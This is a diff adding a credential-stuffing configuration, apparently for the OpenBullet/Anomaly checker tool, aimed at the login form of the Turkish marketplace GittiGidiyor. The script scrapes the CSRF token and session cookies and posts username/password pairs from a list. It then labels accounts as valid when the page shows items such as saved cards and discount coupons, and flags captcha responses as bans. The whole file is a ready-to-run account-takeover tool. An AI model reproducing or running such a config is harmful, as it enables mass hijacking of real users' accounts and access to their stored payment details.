@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "WEB - Gitti Gidiyor",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-20T22:28:06.9580571+03:00",
+  "AdditionalInfo": "",
+  "Author": "scripthub",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.gittigidiyor.com/uye-girisi" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"__RequestVerificationToken\" value=\"" "\"" -> VAR "tk" 
+
+PARSE "<COOKIES(TrackingId)>" LR "" "" -> VAR "tk2" 
+
+PARSE "<COOKIES(PSESSID)>" LR "" "" -> VAR "tk3" 
+
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+REQUEST POST "https://www.gittigidiyor.com/uye-girisi" 
+  CONTENT "__RequestVerificationToken=<tk>&kullanici=<US>&sifre=<PASS>&MYGG=Y&js_kontrol=1&logfrm=1&ITEM=&url=&pass=%C3%9Cye+giri%C5%9Fini+onayl%C4%B1yorum&facebookLoginCheck=0&dmEmailPermission=0&pass=Giri%C5%9F+Yap" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.gittigidiyor.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://www.gittigidiyor.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.gittigidiyor.com/uye-girisi?s=1" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Cookie: TrackingId=<tk2>; _sgf_user_id=5353272756759019521; STARDEAL_PRICE=2; PSESSID=<tk3>; _sgf_session_id=5353282142009270272" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Geçersiz Kullanıcı Adı ve/veya Şifre." 
+    KEY "Lütfen bilgilerinizi kontrol ediniz." 
+  KEYCHAIN Ban OR 
+    KEY "Lütfen güvenlik doğrulamasını (Captcha) yapınız" 
+  KEYCHAIN Success OR 
+    KEY "İndirim Kuponlarım" 
+    KEY "Kayıtlı Kartlarım" 
+    KEY "Çıkış" 
+
